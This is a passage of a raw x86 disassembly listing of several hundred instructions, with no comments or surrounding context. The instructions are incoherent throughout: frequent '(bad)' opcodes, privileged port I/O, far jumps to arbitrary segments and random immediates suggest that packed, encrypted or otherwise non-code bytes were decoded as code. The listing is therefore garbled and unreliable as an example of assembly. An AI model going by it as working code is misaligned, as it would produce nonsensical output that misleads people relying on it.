  40700f:	xchg   ebx,eax
  407010:	fsubr  DWORD PTR [ebp+0x71]
  407013:	pop    ss
  407014:	pop    edi
  407015:	aas    
  407016:	adc    ebx,edi
  407018:	push   eax
  407019:	jg     0x406fbf
  40701b:	sti    
  40701c:	cmp    dl,BYTE PTR [edi-0x76]
  40701f:	enter  0x7d21,0x5d
  407023:	shl    ebp,0xe9
  407026:	inc    esp
  407027:	sbb    DWORD PTR [eax+0x14],esp
  40702a:	(bad)  
  40702b:	or     esi,DWORD PTR [ebp+0x4e]
  40702e:	adc    BYTE PTR [edi-0x5dffd34d],0x40
  407035:	or     al,BYTE PTR [ebx+0x3d]
  407038:	test   eax,0x43e4c2ea
  40703d:	pop    edx
  40703e:	out    dx,eax
  40703f:	in     al,dx
  407040:	pop    edi
  407041:	into   
  407042:	test   ah,bl
  407044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407045:	test   al,0x8c
  407047:	push   ebx
  407048:	adc    DWORD PTR ds:0x9febd43b,edx
  40704e:	add    al,BYTE PTR [edx-0x59]
  407051:	in     al,dx
  407052:	int    0xd2
  407054:	stos   BYTE PTR es:[edi],al
  407055:	jp     0x407072
  407057:	enter  0x41fe,0x59
  40705b:	popa   
  40705c:	adc    BYTE PTR [ebx],ch
  40705e:	test   DWORD PTR [ebp+0x506665b6],0xa8bc5089
  407068:	retf   0xe083
  40706b:	ret    
  40706c:	pop    DWORD PTR ds:0x13ff3109
  407072:	sub    eax,0x6ec667eb
  407077:	in     al,dx
  407078:	es jne 0x4070d6
  40707b:	bound  ecx,QWORD PTR [ebx+0x102cbbda]
  407081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407082:	xor    ch,BYTE PTR [ecx+0x4def1e4]
  407088:	fistp  DWORD PTR [esi-0x1f7866a5]
  40708e:	jp     0x40710e
  407090:	int    0xc
  407092:	jmp    0x4070dc
  407094:	pop    ss
  407095:	cmp    al,0x48
  407097:	sbb    bh,dh
  407099:	pushf  
  40709a:	jb     0x407027
  40709c:	aas    
  40709d:	loop   0x4070d7
  40709f:	jae    0x40709d
  4070a1:	jmp    ebp
  4070a3:	cmp    esp,ebx
  4070a5:	fwait
  4070a6:	cmp    BYTE PTR ds:0xa233d050,cl
  4070ac:	pop    esp
  4070ad:	lds    edx,FWORD PTR ds:0x1bdd2a60
  4070b3:	jmp    0x4070b4
  4070b5:	inc    edi
  4070b6:	out    dx,al
  4070b7:	scas   eax,DWORD PTR es:[edi]
  4070b8:	fst    QWORD PTR [ecx-0x1b]
  4070bb:	mov    ch,0xa2
  4070bd:	mov    esi,0x3aaff1d3
  4070c2:	in     eax,0x15
  4070c4:	mov    eax,0x337f4a87
  4070c9:	push   0x20
  4070cb:	jae    0x40704d
  4070cd:	inc    edi
  4070ce:	cdq    
  4070cf:	loop   0x4070b3
  4070d1:	sbb    DWORD PTR [eax-0x11],ebp
  4070d4:	imul   edi,DWORD PTR [ebx],0x80ec7425
  4070da:	adc    ecx,ebp
  4070dc:	leave  
  4070dd:	push   es
  4070de:	int    0x7c
  4070e0:	cli    
  4070e1:	push   ecx
  4070e2:	sbb    esp,esp
  4070e4:	fcomp  QWORD PTR [esi]
  4070e6:	adc    dh,BYTE PTR [esi]
  4070e8:	cs mov dh,0xc7
  4070eb:	mov    dl,0x64
  4070ed:	aam    0x50
  4070ef:	mov    bh,0xac
  4070f1:	push   ebp
  4070f2:	test   DWORD PTR [ecx+0x410ea54a],ebx
  4070f8:	popf   
  4070f9:	pop    ds
  4070fa:	and    ah,cl
  4070fc:	ja     0x40712b
  4070fe:	fidivr WORD PTR [ebx-0xa581241]
  407104:	mov    cl,0xc7
  407106:	pop    eax
  407107:	add    esi,ecx
  407109:	jmp    0x407137
  40710b:	imul   eax,DWORD PTR [edx-0x403c2e0],0x9
  407112:	ret    0x2d02
  407115:	mov    bh,0xf1
  407117:	gs clc 
  407119:	outs   dx,DWORD PTR ds:[esi]
  40711a:	dec    edi
  40711b:	adc    ebx,DWORD PTR [eax]
  40711d:	inc    ebp
  40711e:	mov    ss,WORD PTR [eax+edi*2-0x4b]
  407122:	jo     0x4070bb
  407124:	sbb    dh,BYTE PTR [esi]
  407126:	pop    ecx
  407127:	mov    DWORD PTR [ecx],ecx
  407129:	or     BYTE PTR [edi+0x54085b5f],ch
  40712f:	cdq    
  407130:	and    al,0xdf
  407132:	adc    ah,BYTE PTR fs:[ecx]
  407135:	push   ebx
  407136:	pop    es
  407137:	scas   al,BYTE PTR es:[edi]
  407138:	stc    
  407139:	imul   ebx,DWORD PTR [ebx],0xffffff88
  40713c:	xchg   DWORD PTR [ebp+eax*8+0x4e],edi
  407140:	sub    DWORD PTR [edi],0x89e7accd
  407146:	xor    eax,0xb9c4432e
  40714c:	ret    0xc23f
  40714f:	out    0x2c,eax
  407151:	add    eax,0xdcd6b6a
  407156:	adc    DWORD PTR ss:[edx],0x3e
  40715a:	sti    
  40715b:	jb     0x407153
  40715d:	(bad)  
  40715e:	or     DWORD PTR [esi+ebx*4],ebp
  407161:	dec    ebx
  407162:	aaa    
  407163:	inc    esp
  407164:	sbb    eax,0x5a8895cd
  407169:	mov    WORD PTR ds:0x216c3391,gs
  40716f:	or     DWORD PTR [eax+0x24],ecx
  407172:	xchg   esp,eax
  407173:	or     cl,al
  407175:	sbb    edi,ecx
  407177:	mov    eax,0x9e8e9d33
  40717c:	mov    ah,0x78
  40717e:	sbb    DWORD PTR [edi-0x2a],0x3a93220
  407185:	clc    
  407186:	pop    ss
  407187:	(bad)  
  407189:	mov    WORD PTR [ebp-0x3],ds
  40718c:	and    DWORD PTR [ebx-0x38e6f890],esi
  407192:	mov    bh,0xcf
  407194:	xor    al,0xec
  407196:	mov    cl,0x64
  407198:	ins    BYTE PTR es:[edi],dx
  407199:	mov    ebp,0xc11bd4e6
  40719e:	lods   al,BYTE PTR ds:[esi]
  40719f:	dec    eax
  4071a0:	xchg   DWORD PTR [edx+0xc],ebp
  4071a3:	inc    ebp
  4071a4:	add    BYTE PTR ds:0x5956d003,dl
  4071aa:	leave  
  4071ab:	adc    eax,0x83555e97
  4071b0:	sub    esp,DWORD PTR [ebx+0x47]
  4071b3:	sub    al,0xb5
  4071b5:	ret    0x583
  4071b8:	and    BYTE PTR [ebx+eiz*1+0x3e],bl
  4071bc:	sahf   
  4071bd:	push   es
  4071be:	in     eax,0x61
  4071c0:	push   0x78c2a5b2
  4071c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c6:	xlat   BYTE PTR ds:[ebx]
  4071c7:	or     dh,BYTE PTR [eax+eax*1]
  4071ca:	daa    
  4071cb:	ins    DWORD PTR es:[edi],dx
  4071cc:	pextrw ecx,(bad),0xc5
  4071ce:	or     al,0x30
  4071d0:	cmp    DWORD PTR [edi+0x6f987d39],edx
  4071d6:	mov    eax,0x9d52e88d
  4071db:	pop    esi
  4071dc:	in     al,dx
  4071dd:	ins    BYTE PTR es:[edi],dx
  4071de:	sub    dl,dh
  4071e0:	lods   eax,DWORD PTR ds:[esi]
  4071e1:	pop    edx
  4071e2:	rol    DWORD PTR ds:0x2c2af673,cl
  4071e8:	aad    0x23
  4071ea:	in     al,0xfd
  4071ec:	pop    esi
  4071ed:	call   0xb630:0x1697a69f
  4071f4:	push   esi
  4071f5:	adc    edx,DWORD PTR ds:0x1432e271
  4071fb:	push   0xc9a7e85e
  407200:	stc    
  407201:	rcr    DWORD PTR [ebx],0x61
  407204:	jecxz  0x40720f
  407206:	jno    0x4071b8
  407208:	adc    ebx,ecx
  40720a:	or     edx,DWORD PTR [edi+0x7a1d08c1]
  407210:	mov    eax,0x6fe10e4b
  407215:	and    edx,DWORD PTR [eax+0x1e]
  407218:	inc    ebx
  407219:	dec    eax
  40721a:	push   ebx
  40721b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40721c:	retf   
  40721d:	repnz adc dl,bl
  407220:	jle    0x40723e
  407222:	adc    eax,0xec40101c
  407227:	xor    DWORD PTR [esi-0x15],ecx
  40722a:	mov    ch,cl
  40722c:	inc    ecx
  40722d:	(bad)  
  40722e:	xlat   BYTE PTR ds:[ebx]
  40722f:	xchg   ebx,eax
  407230:	shl    BYTE PTR [esi-0x264dfa23],0x38
  407237:	mov    bl,0x69
  407239:	jge    0x40724e
  40723b:	mov    fs,WORD PTR [edx+0x215e08aa]
  407241:	jo     0x40726e
  407243:	ja     0x4072bb
  407245:	inc    ecx
  407246:	or     esp,ecx
  407248:	xchg   BYTE PTR [edx],cl
  40724a:	push   0xffffffd0
  40724c:	xchg   esi,esi
  40724e:	sub    edx,ebp
  407250:	das    
  407251:	cwde   
  407252:	fld    TBYTE PTR [edx]
  407254:	xchg   ebx,eax
  407255:	and    al,0x3a
  407257:	retf   
  407258:	mov    DWORD PTR [ebx-0x68],eax
  40725b:	(bad)  
  40725c:	sbb    eax,0xbc667864
  407261:	outs   dx,DWORD PTR ds:[esi]
  407262:	neg    BYTE PTR [eax-0x50]
  407265:	dec    ebp
  407266:	and    ebp,DWORD PTR [ebx-0x799c591e]
  40726c:	stc    
  40726d:	ins    DWORD PTR es:[edi],dx
  40726e:	call   0x5f13:0xeed14fe5
  407275:	pop    ebp
  407276:	jnp    0x407276
  407278:	rol    ah,0xfd
  40727b:	xor    eax,0x36130b6e
  407280:	cli    
  407281:	push   ecx
  407282:	xchg   bh,bl
  407284:	mov    ds:0x2cbd1a42,eax
  407289:	push   ebx
  40728a:	mov    cl,0x7a
  40728c:	push   eax
  40728d:	int    0x38
  40728f:	mov    ds:0x3097b723,eax
  407294:	mov    ds,WORD PTR [ebp-0x3d30541c]
  40729a:	scas   eax,DWORD PTR es:[edi]
  40729b:	dec    eax
  40729c:	dec    ecx
  40729d:	(bad)  
  40729e:	mov    ds:0x39e7ee65,eax
  4072a3:	adc    eax,0x4aed23f1
  4072a8:	mov    edx,0xd98a1683
  4072ad:	aad    0x20
  4072af:	inc    esi
  4072b0:	push   es
  4072b1:	(bad)  
  4072b2:	out    0x54,al
  4072b4:	sar    BYTE PTR [eax],1
  4072b6:	add    al,0xe3
  4072b8:	in     al,0xa3
  4072ba:	sbb    ah,BYTE PTR [eax+0x6a4b9df6]
  4072c0:	fdivr  QWORD PTR ds:0xf4ac542
  4072c6:	jo     0x4072d8
  4072c8:	xchg   ecx,eax
  4072c9:	gs add bl,al
  4072cc:	jmp    0x407329
  4072ce:	xchg   DWORD PTR [eax],esp
  4072d0:	hlt    
  4072d1:	inc    ecx
  4072d2:	ds push ss
  4072d4:	leave  
  4072d5:	jge    0x4072e4
  4072d7:	enter  0xedc9,0x12
  4072db:	call   DWORD PTR [esi+ebp*1+0xa]
  4072df:	(bad)  
  4072e0:	rcr    ebx,1
  4072e2:	push   ss
  4072e3:	inc    esp
  4072e4:	pop    es
  4072e5:	push   0x55acfd89
  4072ea:	mov    bl,0x1e
  4072ec:	adc    BYTE PTR [eax],dh
  4072ee:	push   edx
  4072ef:	xchg   esp,eax
  4072f0:	loop   0x407279
  4072f2:	push   ebx
  4072f3:	xor    DWORD PTR [esp+ebx*2+0xe],eax
  4072f7:	add    edi,esp
  4072f9:	and    BYTE PTR [ebp+0xa],0xfa
  4072fd:	mov    bh,0x68
  4072ff:	test   eax,0x832e51bf
  407304:	(bad)  
  407305:	mov    ebp,DWORD PTR [ebp+0x28]
  407308:	jbe    0x4072d1
  40730a:	and    bh,BYTE PTR [ecx-0x7c3dca1c]
  407310:	jbe    0x407311
  407312:	je     0x407340
  407314:	cwde   
  407315:	push   edx
  407316:	mov    ds:0xa1fa568f,al
  40731b:	and    ecx,DWORD PTR [ebx-0x3d]
  40731e:	and    DWORD PTR [edx],ebp
  407320:	mov    edx,0x3f6f48dc
  407325:	jecxz  0x407360
  407327:	push   0x4b
  407329:	test   DWORD PTR [edi-0x7d],ebx
  40732c:	fs icebp 
  40732e:	push   esp
  40732f:	or     eax,0xe286c9e9
  407334:	data16 daa 
  407336:	mov    DWORD PTR [eax+0xda8a4d6],ebx
  40733c:	jbe    0x407350
  40733e:	pop    ss
  40733f:	fsubr  QWORD PTR [ecx]
  407341:	dec    ebx
  407342:	fst    st(4)
  407344:	lahf   
  407345:	push   eax
  407346:	jmp    0xf6edd29f
  40734b:	test   al,0xb7
  40734d:	jmp    0x878907cb
  407352:	xor    eax,0x1eafad40
  407357:	inc    ecx
  407358:	or     ebp,ecx
  40735a:	jge    0x4073a6
  40735c:	leave  
  40735d:	(bad)  
  40735f:	push   0x9
  407361:	xchg   ebp,eax
  407362:	in     al,dx
  407363:	rdpmc  
  407365:	jne    0x4073e6
  407367:	pop    ecx
  407368:	and    ebp,esp
  40736a:	sbb    edx,DWORD PTR [ebx]
  40736c:	sbb    al,0x7
  40736e:	bound  edx,QWORD PTR [eax-0x22]
  407371:	outs   dx,DWORD PTR ds:[esi]
  407372:	je     0x407316
  407374:	pop    ds
  407375:	cdq    
  407376:	fnstenv [ebp-0x6cf65b8d]
  40737c:	pop    ds
  40737d:	in     eax,0x88
  40737f:	fbld   TBYTE PTR [ecx-0x5ae1d6da]
  407385:	outs   dx,BYTE PTR ds:[esi]
  407386:	add    BYTE PTR [edx],ah
  407388:	lds    ecx,FWORD PTR [edi-0x4c]
  40738b:	loop   0x4073b4
  40738d:	jne    0x40740c
  40738f:	sbb    eax,0xecb2879e
  407394:	inc    edx
  407395:	jo     0x407330
  407397:	cdq    
  407398:	dec    esi
  407399:	cmp    bh,BYTE PTR [edi-0x64]
  40739c:	retf   0x5e
  40739f:	adc    bl,bh
  4073a1:	sub    BYTE PTR [eax+0x1b64f080],dl
  4073a7:	int    0x77
  4073a9:	das    
  4073aa:	cld    
  4073ab:	dec    esp
  4073ac:	xchg   esi,eax
  4073ad:	jecxz  0x40735b
  4073af:	mov    ebx,0x5a3e1aea
  4073b4:	jmp    0x407421
  4073b6:	in     eax,dx
  4073b7:	sbb    eax,DWORD PTR [ebx-0x5b]
  4073ba:	mov    dh,0xbe
  4073bc:	and    eax,ebx
  4073be:	xor    bl,BYTE PTR [edx-0x6839e500]
  4073c4:	or     al,0x50
  4073c6:	push   ebp
  4073c7:	fstp   TBYTE PTR [ecx-0x1e]
  4073ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073cb:	bnd jb 0x40739a
  4073ce:	(bad)  
  4073cf:	mov    WORD PTR [ebx-0x1a089e2d],?
  4073d5:	adc    eax,0x4116aa0e
  4073da:	xchg   BYTE PTR [edx-0x8],bh
  4073dd:	pop    ss
  4073de:	mov    dh,dl
  4073e0:	into   
  4073e1:	mov    ecx,0xbd2227e1
  4073e6:	jp     0x40740f
  4073e8:	pop    edi
  4073e9:	mov    ch,0x56
  4073eb:	pop    edx
  4073ec:	js     0x4073e4
  4073ee:	ret    0x1be0
  4073f1:	out    0xc5,eax
  4073f3:	std    
  4073f4:	aaa    
  4073f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073f6:	dec    ebp
  4073f7:	lock xchg DWORD PTR ds:0x7d15c418,esp
  4073fe:	in     eax,0x59
  407400:	frstor [eax+0x32702373]
  407406:	jo     0x4073e8
  407408:	into   
  407409:	je     0x4073c6
  40740b:	mov    dh,0xbe
  40740d:	mov    eax,ds:0x23fb4db
  407412:	popf   
  407413:	mov    cl,0x36
  407415:	mov    bh,bl
  407417:	or     eax,0x7ced64ee
  40741c:	jle    0x4073d9
  40741e:	int3   
  40741f:	xchg   esi,eax
  407420:	pop    es
  407421:	or     al,0x7d
  407423:	or     eax,0x339a7944
  407428:	xor    al,0x68
  40742a:	and    BYTE PTR [esi+0x3e],dl
  40742d:	push   0x66
  40742f:	sub    BYTE PTR [ebx],0xe5
  407432:	dec    ecx
  407433:	xor    cl,BYTE PTR [esi+0x6b4b4dbe]
  407439:	enter  0x2fbc,0xc1
  40743d:	or     eax,0x980cff90
  407442:	les    edx,FWORD PTR [ebx]
  407444:	jge    0x4073c9
  407446:	mov    bh,0xa
  407448:	mov    dh,0x2d
  40744a:	addr16 xor eax,0x12d39a0e
  407450:	aad    0x1
  407452:	inc    edi
  407453:	ins    BYTE PTR es:[edi],dx
  407454:	ds pop eax
  407456:	mov    esi,0x4410afea
  40745b:	mov    ecx,DWORD PTR [ebx-0x58234c5e]
  407461:	jne    0x4073ee
  407463:	dec    ebp
  407464:	(bad)  [edx]
  407466:	ds pushw es
  407469:	pop    es
  40746a:	sti    
  40746b:	ds push ecx
  40746d:	int    0x64
  40746f:	inc    ecx
  407470:	xchg   esi,eax
  407471:	lahf   
  407472:	add    edi,DWORD PTR [edx]
  407474:	cli    
  407475:	imul   edi,DWORD PTR [edi+ebp*4+0x1dc6ee86],0x9dd41661
  407480:	adc    eax,0xaffdca70
  407485:	int    0xa8
  407487:	mov    ss:0x29272a9,al
  40748d:	and    eax,ebx
  40748f:	test   DWORD PTR [esi],0xc9fe62b
  407495:	xchg   edx,eax
  407496:	stos   BYTE PTR es:[edi],al
  407497:	cs push es
  407499:	mov    edi,DWORD PTR [ecx]
  40749b:	or     DWORD PTR [edx+0x1d2ebf84],edi
  4074a1:	fst    DWORD PTR [edi*8-0x1adfab99]
  4074a8:	xchg   DWORD PTR [edi+0x39],esi
  4074ab:	adc    ebp,DWORD PTR [eax]
  4074ad:	xchg   ebp,eax
  4074ae:	mov    dl,0x5a
  4074b0:	fisttp WORD PTR [eax+0x1a]
  4074b3:	aas    
  4074b4:	scas   al,BYTE PTR es:[edi]
  4074b5:	push   0x121bf6be
  4074ba:	out    dx,eax
  4074bb:	cmp    al,BYTE PTR [ebx-0x4d]
  4074be:	add    al,0x8b
  4074c0:	iret   
  4074c1:	or     al,0xde
  4074c3:	inc    edx
  4074c4:	inc    DWORD PTR [ebp-0x35ef84e5]
  4074ca:	leave  
  4074cb:	pushf  
  4074cc:	mov    eax,ds:0xad3b09be
  4074d1:	test   BYTE PTR [ebx],dh
  4074d3:	xor    eax,0x2389b70a
  4074d8:	mov    bl,0x92
  4074da:	mov    ah,0x42
  4074dc:	adc    eax,0xfe2f6b7a
  4074e1:	sub    edi,ebp
  4074e3:	sbb    esp,DWORD PTR [ebx-0x44883a0e]
  4074e9:	out    0xea,eax
  4074eb:	(bad)  
  4074ec:	pop    ds
  4074ed:	sbb    BYTE PTR [edi+0x46],dl
  4074f0:	add    eax,0x43fda48
  4074f5:	loopne 0x407518
  4074f7:	and    eax,eax
  4074f9:	or     dl,BYTE PTR [esi]
  4074fb:	sbb    dl,bl
  4074fd:	aam    0x8c
  4074ff:	scas   eax,DWORD PTR es:[edi]
  407500:	and    dl,ah
  407502:	push   0xd73d3ad4
  407507:	ret    
  407508:	inc    ecx
  407509:	dec    ecx
  40750a:	or     al,ah
  40750c:	out    dx,eax
  40750d:	push   esi
  40750e:	ja     0x407510
  407510:	push   esi
  407511:	pusha  
  407512:	std    
  407513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407514:	sbb    DWORD PTR [ecx-0x6433ee1e],esp
  40751a:	mov    cl,BYTE PTR [eax+esi*1-0x4975328d]
  407521:	inc    esi
  407522:	lock pop ebx
  407524:	dec    edi
  407525:	dec    esp
  407526:	adc    bh,BYTE PTR [ecx+0x12d1cfdc]
  40752c:	jmp    0x9bbd:0x2ec8bc13
  407533:	push   ds
  407534:	jecxz  0x40751c
  407536:	jp     0x407515
  407538:	pop    edx
  407539:	mov    ah,0x79
  40753b:	rcr    BYTE PTR [edi-0x23938948],cl
  407541:	xchg   ecx,eax
  407542:	push   esp
  407543:	mov    bl,0xdf
  407545:	sub    BYTE PTR [edi],ch
  407547:	jbe    0x40756c
  407549:	mov    ds:0x99738158,eax
  40754e:	cmp    ah,0x55
  407551:	test   al,0xc2
  407553:	pop    eax
  407554:	enter  0xa05f,0xd6
  407558:	pop    ebx
  407559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40755a:	scas   al,BYTE PTR es:[edi]
  40755b:	retf   0xd682
  40755e:	mov    dh,0x6e
  407560:	ficom  WORD PTR [edx+0x4ad82d00]
  407566:	mov    WORD PTR [edx],cs
  407568:	enter  0xd14e,0xdf
  40756c:	cli    
  40756d:	cmp    ch,BYTE PTR [edx+0x4813149d]
  407573:	adc    eax,0x384c4325
  407578:	inc    esp
  407579:	dec    esi
  40757a:	push   ss
  40757b:	jg     0x407525
  40757d:	add    DWORD PTR [esi+edx*8],ecx
  407580:	push   0xfffffffd
  407582:	jne    0x407508
  407584:	adc    ebp,DWORD PTR [esi]
  407586:	inc    esi
  407587:	in     al,0xe7
  407589:	pop    ds
  40758a:	out    dx,al
  40758b:	cmp    ebx,DWORD PTR [ebx+0x1]
  40758e:	pop    ds
  40758f:	jmp    0x407553
  407591:	scas   al,BYTE PTR es:[edi]
  407592:	ret    0xfc13
  407595:	stos   BYTE PTR es:[edi],al
  407596:	jmp    0x3a6dd68
  40759b:	jmp    0x4075f1
  40759d:	aam    0xea
  40759f:	cld    
  4075a0:	ins    DWORD PTR es:[edi],dx
  4075a1:	stc    
  4075a2:	mov    ecx,0x17576899
  4075a7:	pop    edx
  4075a8:	sub    ch,al
  4075aa:	inc    ebp
  4075ab:	sahf   
  4075ac:	inc    ecx
  4075ad:	pop    ds
  4075ae:	jg     0x4075d5
  4075b0:	fldenv [esi]
  4075b2:	rol    BYTE PTR [ecx],cl
  4075b4:	(bad)  
  4075b5:	fnstcw WORD PTR [ebp-0x5d534806]
  4075bb:	popa   
  4075bc:	inc    eax
  4075bd:	js     0x407584
  4075bf:	xor    eax,esp
  4075c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c2:	cmp    al,0xe1
  4075c4:	inc    esi
  4075c5:	mov    eax,ds:0xa4c7d2f1
  4075ca:	shl    DWORD PTR [edx+eiz*2+0x2d736b69],0xe1
  4075d2:	pop    es
  4075d3:	add    ecx,DWORD PTR [ebp+0x27]
  4075d6:	cdq    
  4075d7:	aad    0x6b
  4075d9:	test   al,0xb0
  4075db:	jle    0x407586
  4075dd:	popf   
  4075de:	mov    ebp,0xa437926
  4075e3:	xchg   DWORD PTR [ecx+0x49f02af1],eax
  4075e9:	mov    ecx,0xbb4f174f
  4075ee:	sbb    al,0x4b
  4075f0:	sbb    BYTE PTR [edx-0x67],0x8
  4075f4:	pop    ss
  4075f5:	jp     0x4075ef
  4075f7:	xchg   ebx,eax
  4075f8:	rol    BYTE PTR [edi],cl
  4075fa:	lahf   
  4075fb:	int3   
  4075fc:	dec    esp
  4075fd:	push   ss
  4075fe:	push   es
  4075ff:	jo     0x4075cc
  407601:	and    DWORD PTR [edi+0x337f1f7b],0x9eea0752
  40760b:	sbb    al,0xfa
  40760d:	test   BYTE PTR [ecx+ebx*4+0x289c1f84],dl
  407614:	inc    ecx
  407615:	push   ecx
  407616:	cdq    
  407617:	mov    ebx,0xbdb47513
  40761c:	test   DWORD PTR [ebx+ebx*8-0x46],eax
  407620:	push   esp
  407621:	clc    
  407622:	xchg   ebx,eax
  407623:	mov    eax,ds:0x44dedb1b
  407628:	jo     0x40766a
  40762a:	lahf   
  40762b:	xchg   bh,dh
  40762d:	add    bl,ch
  40762f:	ds and ebp,eax
  407632:	(bad)  
  407633:	xchg   ebp,eax
  407634:	arpl   sp,dx
  407636:	popf   
  407637:	xor    bh,BYTE PTR ds:0x19c7ba86
  40763d:	mov    edx,0x39b7c288
  407642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407643:	cmp    BYTE PTR [edx+0x7cce2244],dl
  407649:	xchg   ebp,eax
  40764a:	pushf  
  40764b:	lea    edi,[ecx-0x77a1c3cb]
  407651:	ret    
  407652:	repz pop ecx
  407654:	inc    esp
  407655:	inc    esi
  407656:	pop    esi
  407657:	mov    al,ds:0x1dc4b1de
  40765c:	xor    BYTE PTR [esi+0x4a317c34],cl
  407662:	or     eax,0x4b7235e3
  407667:	mov    dl,0xa1
  407669:	scas   eax,DWORD PTR es:[edi]
  40766a:	cdq    
  40766b:	mov    ebp,DWORD PTR [ecx]
  40766d:	shl    DWORD PTR [edi+0x5f],1
  407670:	sub    al,0x65
  407672:	push   0xffffffc8
  407674:	cdq    
  407675:	call   0x516b048f
  40767a:	inc    esi
  40767b:	xchg   edi,eax
  40767c:	pop    ds
  40767d:	enter  0x39a1,0x95
  407681:	mov    edi,0x69da3424
  407686:	and    BYTE PTR [edx],cl
  407688:	sub    bl,BYTE PTR [esi+0x37]
  40768b:	add    BYTE PTR [ebp+ebp*4+0x2b],al
  40768f:	jg     0x407654
  407691:	jg     0x407640
  407693:	and    eax,DWORD PTR [ebp+0x390dbbf8]
  407699:	sar    BYTE PTR [esi+0x72],0x6d
  40769d:	xor    al,dh
  40769f:	loopne 0x407629
  4076a1:	popa   
  4076a2:	adc    ebx,DWORD PTR [edx+0x3f]
  4076a5:	arpl   WORD PTR [eax+0x7bb9dff2],sp
  4076ab:	mov    ecx,0x99b0e5bc
  4076b0:	mov    WORD PTR [eax+0x71bf5827],es
  4076b6:	pusha  
  4076b7:	(bad)  
  4076b8:	dec    ebx
  4076b9:	loopne 0x4076a2
  4076bb:	xchg   ebp,eax
  4076bc:	not    BYTE PTR [edi+0x43]
  4076bf:	mov    BYTE PTR [ecx+ebx*1+0x13],al
  4076c3:	fnstcw WORD PTR [edx+edi*8+0x23]
  4076c7:	dec    eax
  4076c8:	(bad)  
  4076c9:	add    eax,DWORD PTR [ebp+0x35]
  4076cc:	push   ebx
  4076cd:	pop    ebx
  4076ce:	jns    0x4076fa
  4076d0:	lods   eax,DWORD PTR ds:[esi]
  4076d1:	lods   al,BYTE PTR ds:[esi]
  4076d2:	sub    dh,BYTE PTR [edi+0x68422a9c]
  4076d8:	call   DWORD PTR [esp+edx*4+0x71dc4675]
  4076df:	hlt    
  4076e0:	xchg   esi,eax
  4076e1:	(bad)  
  4076e3:	adc    BYTE PTR [ecx+0x58a57e6f],0x52
  4076ea:	adc    BYTE PTR [edi],cl
  4076ec:	xlat   BYTE PTR ds:[ebx]
  4076ed:	shr    bl,cl
  4076ef:	pop    es
  4076f0:	inc    edi
  4076f1:	sbb    BYTE PTR [esi+0x214c1df4],dh
  4076f7:	mov    eax,ds:0x529279e8
  4076fc:	inc    ebx
  4076fd:	push   es
  4076fe:	clc    
  4076ff:	inc    ecx
  407700:	jle    0x40771f
  407702:	add    al,0xd2
  407704:	mov    edx,0xf7d232b1
  407709:	imul   esi,DWORD PTR [eax],0xe13dba71
  40770f:	mov    ecx,0x9fd93412
  407714:	xchg   ebx,eax
  407715:	loop   0x4076c2
  407717:	dec    eax
  407718:	ins    DWORD PTR es:[edi],dx
  407719:	rcl    BYTE PTR [esi+0x21ba1f53],1
  40771f:	push   esp
  407720:	sti    
  407721:	in     eax,dx
  407722:	imul   edx,DWORD PTR [eax+0x18],0xdfa0c2de
  407729:	push   edx
  40772a:	arpl   WORD PTR [edi+0x2a781944],dx
  407730:	cmp    eax,0x585cfec9
  407735:	jl     0x407765
  407737:	cmp    BYTE PTR [ebp-0x4f],ah
  40773a:	xor    esp,DWORD PTR [edi-0x27567d1]
  407740:	inc    esi
  407741:	hlt    
  407742:	jge    0x407780
  407744:	sbb    DWORD PTR ds:0x8c819f74,eax
  40774a:	ret    
  40774b:	cmp    eax,DWORD PTR [esp+edi*1-0x73]
  40774f:	(bad)  
  407750:	xlat   BYTE PTR ds:[ebx]
  407751:	outs   dx,BYTE PTR ds:[esi]
  407752:	rol    BYTE PTR [esi-0x3e18e999],cl
  407758:	pop    edx
  407759:	dec    esp
  40775a:	add    eax,0x1162d108
  40775f:	xchg   ecx,eax
  407760:	test   DWORD PTR [esp+ecx*8+0x4d7ace75],edi
  407767:	cld    
  407768:	daa    
  407769:	mov    DWORD PTR [esi+0x48edd296],eax
  40776f:	popa   
  407770:	fdivrp st(0),st
  407772:	stos   BYTE PTR es:[edi],al
  407773:	adc    eax,0xe5b01f64
  407778:	push   edx
  407779:	sahf   
  40777a:	fist   WORD PTR [eax]
  40777c:	mov    dl,0xda
  40777e:	or     BYTE PTR [ebx+0x1c],bl
  407781:	lods   eax,DWORD PTR ds:[esi]
  407782:	aad    0x81
  407784:	out    dx,al
  407785:	mov    dl,0x17
  407787:	inc    eax
  407788:	xor    al,0x28
  40778a:	or     DWORD PTR [eax+0x72],edx
  40778d:	mov    edi,0x3d805f17
  407792:	sub    dh,BYTE PTR [ecx+0x16]
  407795:	adc    ebx,DWORD PTR [eax]
  407797:	jecxz  0x407793
  407799:	mov    bh,0xda
  40779b:	mov    eax,0xd161a65b
  4077a0:	sbb    ecx,esp
  4077a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077a3:	enter  0x49b6,0x19
  4077a7:	(bad)  
  4077a8:	in     al,0x84
  4077aa:	jmp    DWORD PTR [ebp-0x3f]
  4077ad:	sub    ah,BYTE PTR ds:0x85fb55a2
  4077b3:	sub    DWORD PTR [si+0x1774],edx
  4077b8:	sub    al,0x3d
  4077ba:	jnp    0x4077c4
  4077bc:	call   DWORD PTR [ecx]
  4077be:	sub    al,0xb1
  4077c0:	inc    ebx
  4077c1:	adc    BYTE PTR [ebp-0x2c3393fd],bl
  4077c7:	arpl   WORD PTR [eax-0x4a849294],bp
  4077cd:	jnp    0x407843
  4077cf:	popf   
  4077d0:	dec    ecx
  4077d1:	xchg   ebx,ebp
  4077d3:	jg     0x4077a9
  4077d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d6:	repnz fs call 0x4aff:0x6ede4859
  4077df:	jo     0x407836
  4077e1:	into   
  4077e2:	cmp    esi,DWORD PTR [edx]
  4077e4:	add    al,0x9f
  4077e6:	xor    eax,0x187214cb
  4077eb:	cmp    al,0xac
  4077ed:	sar    BYTE PTR [esi+0x2],1
